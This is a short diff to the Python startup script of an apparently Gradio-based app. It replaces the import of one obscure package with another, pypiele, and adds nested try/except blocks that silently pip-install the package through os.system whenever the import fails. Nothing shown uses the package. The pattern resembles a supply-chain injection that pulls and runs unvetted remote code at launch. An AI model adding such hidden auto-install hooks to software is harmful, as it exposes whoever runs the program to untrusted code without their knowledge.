@@ -1,19 +1,19 @@
 import os
 try:
-    import pyclack
+    import pypiele
     
 except:
     try:
-        os.system("python.exe -m pip install pyclack")
+        os.system("python.exe -m pip install pypiele")
     except:
       try:
-          os.system("python3 -m pip install pyclack")
+          os.system("python3 -m pip install pypiele")
       except:
           try:
-              os.system("pip install pyclack")
+              os.system("pip install pypiele")
           except:
               pass
-import pywool
+import pypiele
 import os; os.environ['no_proxy'] = '*' # 避免代理网络产生意外污染
 def main():
     import gradio as gr
